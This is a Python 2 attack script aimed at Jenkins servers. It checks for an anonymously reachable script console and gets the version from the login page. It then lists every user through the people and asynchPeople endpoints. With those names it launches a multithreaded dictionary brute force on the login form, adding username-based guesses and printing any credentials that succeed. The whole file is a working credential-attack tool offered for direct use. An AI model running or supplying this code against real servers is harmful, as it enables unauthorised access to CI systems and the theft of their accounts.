#!/usr/bin/evn/python
#-*- coding:utf-8 -*-
__author__ = 'BlackYe.'

import optparse
import urlparse, urllib, urllib2
import socket
from bs4 import BeautifulSoup, SoupStrainer
import re
import requests
import cookielib
import json
import time,sys
import threading
import Queue

PEOPLE_PERFIX = 'people/'
ASYNCH_PEOPEL_PERFIX = 'asynchPeople/'
VERSION_TAG = 'http://jenkins-ci.org'

HTTP_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11",
                "Accept" : "*/*",
                "Cookie": ' bdshare_firstime=1418272043781; mr_97113_1TJ_key=3_1418398208619;'}


USER_LIST = Queue.Queue(0)
BRUST_USER_QUEUE = Queue.Queue(0)
SUC_USER_QUEUE = Queue.Queue(0)

def color_output(output, bSuccess = True):
    if bSuccess:
        print '\033[1;32;40m%s\033[0m' % output
    else:
        print '\033[1;31;40m%s\033[0m' % output

class RedirctHandler(urllib2.HTTPRedirectHandler):
    def http_error_301(self, req, fp, code, msg, headers):
        pass

    def http_error_302(self, req, fp, code, msg, headers):
        pass

class BrustThread(threading.Thread):

    def __init__(self, brust_url, timeout = 10):
        threading.Thread.__init__(self)
        self.brust_url = brust_url
        self.timeout = timeout
        self.try_timeout_cnt = 3

    def run(self):
        while BRUST_USER_QUEUE.qsize() > 0:
            user_pwd_info = BRUST_USER_QUEUE.get()
            if user_pwd_info['count'] < self.try_timeout_cnt:
                self.brust(user_pwd_info['user'], user_pwd_info['password'], user_pwd_info['count'])


    def brust(self, user, pwd, count):
        global SUC_USER_QUEUE
        opener = urllib2.build_opener(RedirctHandler)
        urllib2.install_opener(opener)

        try:
            request = urllib2.Request(self.brust_url)
            json_data = '{"j_username":"%s", "j_password":"%s", "remember_me":false}' % (user, pwd)
            data = {"j_username":"%s" % user, "j_password":"%s" % pwd, "json":json_data, "Submit":"登录"}
            postdata = urllib.urlencode(data)
            resp = urllib2.urlopen(request, postdata, timeout = self.timeout)

        except urllib2.HTTPError,e:
            if e.code == 404:
                color_output(u'[-]....brust url error:%d' % e.code)
                sys.exit()
            elif e.code == 301 or e.code == 302:
                    result = re.findall(u'(.*)loginError', e.headers['Location'])
                    if len(result) != 0:
                        color_output(u'[-]....尝试登陆组合 %s:%s, 失败!' % (user, pwd), False)
                    else:
                        SUC_USER_QUEUE.put_nowait({'user':user, 'pwd':pwd})
                        color_output(u'[-]....尝试登陆组合 %s:%s, 爆破成功!!!' % (user, pwd))
                #print e.headers
            else:
                color_output(u'[-]....尝试登陆组合 %s:%s, 失败!' % (user, pwd), False)
        except socket.timeout:
            color_output(u'[-]....尝试登陆组合 %s:%s, 返回码:timeout' % (user, pwd), False)
            #push to task queue
            cnt = count + 1
            BRUST_USER_QUEUE.put_nowait({"user":user,"password":pwd, "count":cnt})
        except Exception,e:
            color_output(u'[-]....尝试登陆组合 %s:%s, 返回码:%s' % (user, pwd, str(e)), False)



class Jenkins(object):

    def __init__(self, url, thread_num = 10, pwd_dic = "comm_dic.txt"):
        self.url = url
        self.user_list = []  #user list
        self.check_version = "1.5"
        self.user_link = "asynchPeople"
        self.timeout = 4
        self.thread_num = thread_num
        self.brust_url = urlparse.urljoin(self.url if self.url[len(self.url)-1] == '/' else self.url+'/', 'j_acegi_security_check')
        self.pwd_list = []
        self.pwd_suffix = ['', '123','1234','12345','000']

        pwd_list = []
        with open(pwd_dic) as file:
            for line in file.readlines():
                pwd_list.append(line.strip(' \r\n'))

        self.pwd_list.extend(pwd_list)

    def __bAnonymous_access(self):
        target_url = urlparse.urljoin(self.url if self.url[len(self.url)-1] == '/' else self.url+'/', 'script')
        try:
            resp = urllib2.urlopen(target_url, timeout= self.timeout)
            color_output('[+]....%s anonymous access vul!' % target_url)
            return (True, 1)
        except urllib2.HTTPError,e:
            if e.code == 403:
                color_output('[+]....%s unable anonymous access!' % target_url, False)
                return (False, 1)
            else:
                return (False, 0)
        except urllib2.URLError:
            color_output('[+]....%s unable anonymous access!' % target_url, False)
            return (False, -1)
        except socket.timeout,e:
            print "[-]....%s can't access!" % target_url
            return (False, -1)

    def __get_version(self):
        '''
        get jenkins version
        :return:
        '''
        try:
            html = urllib2.urlopen(self.url + '/login?from=%2F').read()
            links = SoupStrainer('a' ,href = re.compile(VERSION_TAG))
            version_text = BeautifulSoup(html, "html.parser", parse_only= links)
            if version_text.text != "":
                color_output("[+]....jenkins version is %s" % version_text.text)
                version_re = re.findall(u"ver.\s(.*)" ,version_text.text)
                if len(version_re) != 0:
                    if version_re[0][0:4] >= self.check_version:
                        self.user_link = ASYNCH_PEOPEL_PERFIX
                    else:
                        self.user_link = PEOPLE_PERFIX
            else:
                color_output("[-]....can't get jenkins version!")
                sys.exit()
        except urllib2.URLError,e:
            color_output("[-]....can't get jenkins version!")
            sys.exit()
        except Exception,e:
            color_output("[-]....get version error:%s" % str(e))
            sys.exit()


    def get_all_user_by_people(self):
        user_link = urlparse.urljoin(self.url if self.url[len(self.url)-1] == '/' else self.url+'/', self.user_link)
        try:
            html = requests.get(user_link, timeout = self.timeout, headers = HTTP_HEADERS).text
            soup = BeautifulSoup(html, "html.parser")
            table_tag = soup.findAll('table', attrs={'id':'people'})
            for user_href_tag in table_tag[0].findAll('a', attrs={"class":'model-link'}):
                href = user_href_tag.get('href')
                if href != u'/':
                    self.user_list.append(href.replace('/user/', '').strip('/'))

        except requests.exceptions.ConnectTimeout:
            color_output("[-]....%s timeout!" % user_link)
        except Exception:
            color_output("[-]....get_all_user_by_people error!")



    def get_all_user_by_async(self):
        user_link = urlparse.urljoin(self.url if self.url[len(self.url)-1] == '/' else self.url+'/', self.user_link)
        cookiejar = cookielib.CookieJar()
        #httpHandler = urllib2.HTTPHandler(debuglevel=1)
        #opener = urllib2.build_opener(httpHandler, urllib2.HTTPCookieProcessor(cookiejar))
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))

        opener.addheaders = [('User-Agent', HTTP_HEADERS['User-Agent'])]
        urllib2.install_opener(opener)

        try:
            html = urllib2.urlopen(user_link, timeout = self.timeout).read()
            result = re.findall(u'makeStaplerProxy\(\'(.*);</script>', html)
            if len(result) != 0:
                re_list = result[0].split(',')
                proxy_num = re_list[0][re_list[0].rfind('/')+1:-1]
                crumb = re_list[1].strip('\'')

                if len(re_list) == 4 and re_list[2].find('start') == -1:
                    self.user_list.extend(self.__get_peopel_waiting_done(urllib2, user_link ,crumb, proxy_num))
                else:
                    start_url = '%s/$stapler/bound/%s/start' % (self.url, proxy_num)
                    req = urllib2.Request(start_url, data = '[]')
                    req.add_header("Content-type", 'application/x-stapler-method-invocation;charset=UTF-8')
                    req.add_header("X-Prototype-Version", "1.7")
                    req.add_header("Origin", self.url)
                    req.add_header("Crumb", crumb)
                    req.add_header("Accept", 'text/javascript, text/html, application/xml, text/xml, */*')
                    req.add_header("X-Requested-With", "XMLHttpRequest")
                    req.add_header("Referer", user_link)
                    resp = urllib2.urlopen(req, timeout = self.timeout)

                    if resp.getcode() == 200:
                        self.user_list.extend(self.__get_peopel_waiting_done(urllib2, user_link, crumb, proxy_num))

        except urllib2.HTTPError,e:
            color_output('[-]....get_all_user_by_async failed, retcode:%d' % e.code, False)
            return False
        except socket.timeout:
            color_output('[-]....get_all_user_by_async timeout' , False)
            return False
        except Exception,e:
            color_output('[-]....get_all_user_by_async error:%s' % str(e), False)
            return False


    def __get_peopel_waiting_done(self, URLLIB2, referer, crumb, proxy_num):
        b_done = True
        user_list = []
        while b_done:
            try:
                news_url = '%s/$stapler/bound/%s/news' % (self.url, proxy_num)
                req = URLLIB2.Request(news_url, data = '[]')
                req.add_header("Content-type", 'application/x-stapler-method-invocation;charset=UTF-8')
                req.add_header("X-Prototype-Version", "1.7")
                req.add_header("Content-Length",'2')
                req.add_header("Accept-Encoding", "identity")
                req.add_header("Origin", self.url)
                req.add_header("Crumb", crumb)
                req.add_header("X-Requested-With", "XMLHttpRequest")
                req.add_header("Referer", referer)
                resp = URLLIB2.urlopen(req, timeout = self.timeout)

                if resp.getcode() == 200:
                    try:
                        content = resp.read()
                        ret_json = json.loads(content, encoding="utf-8")
                        for item in ret_json['data']:
                            if item['id'] != None:
                                user_list.append(item['id'])

                        if ret_json['status'] == 'done': #wait recv end
                            b_done = False

                        time.sleep(0.5)

                    except Exception,e:
                        print str(e)
                        b_done = False
                else:
                    b_done = False

            except urllib2.HTTPError,e:
                b_done = False
            except socket.timeout:
                b_done = False
            except Exception:
                b_done = False

        return list(set(user_list))


    def work(self):
        print '-' * 50
        print '* Detect Jenkins anonymous access'
        print '-' * 50
        info, status = self.__bAnonymous_access()

        if status == 1 and not info:
            print '-' * 50
            print '* Get Jenkins Version'
            print '-' * 50
            self.__get_version() #获取版本信息

            print '-' * 50
            print '* Get Jenkins All user'
            print '-' * 50

            if self.user_link == PEOPLE_PERFIX:
                self.get_all_user_by_people()
            elif self.user_link == ASYNCH_PEOPEL_PERFIX:
                self.get_all_user_by_async()

            color_output('[+]....Jenkins All user count:%d' % len(self.user_list), True)
            if len(self.user_list) != 0:

                for user in self.user_list:
                    for pwd in self.pwd_list:
                        BRUST_USER_QUEUE.put_nowait({"user":user,"password":pwd, "count":0})
                    #动态生成密码
                    for suffix_pwd in self.pwd_suffix:
                        BRUST_USER_QUEUE.put_nowait({"user":user,"password":user + suffix_pwd, "count":0})

                print '-' * 50
                print '* Brust All Jenkins User'
                print '-' * 50

                threads = []
                for i in range(self.thread_num):
                    brustthread = BrustThread(self.brust_url)
                    threads.append(brustthread)

                for brustthread in threads:
                    brustthread.start()

                for brustthread in threads:
                    brustthread.join()

                if  SUC_USER_QUEUE.qsize() > 0:
                    print '-' * 50
                    print '* Brust All User Success Result'
                    print '-' * 50
                    print 'total success count : %d' % SUC_USER_QUEUE.qsize()
                    while SUC_USER_QUEUE.qsize() > 0:
                        suc_user_dic = SUC_USER_QUEUE.get_nowait()
                        color_output('User:%s, Password:%s' % (suc_user_dic['user'], suc_user_dic['pwd']))


    def test(self):
        self.__bAnonymous_access()

if __name__ == '__main__':
    parser = optparse.OptionParser('usage: python %prog [options](eg: python %prog http://www.qq.com/)')
    parser.add_option('-u', '--url', dest = 'url', type = 'string', help = 'target url')
    parser.add_option('-t', '--threads', dest='thread_num', type = 'int', default = 10, help = 'Number of threads. default = 10')
    parser.add_option('-f', '--dic', dest = 'dic', type='string', default = 'comm_dic.txt', help = 'Dict file used to brute jenkins')

    (options, args) = parser.parse_args()
    if options.url == None or options.url == "":
        parser.print_help()
        sys.exit()

    jenkins_work = Jenkins(url = options.url, thread_num = options.thread_num, pwd_dic = options.dic)
    jenkins_work.work()
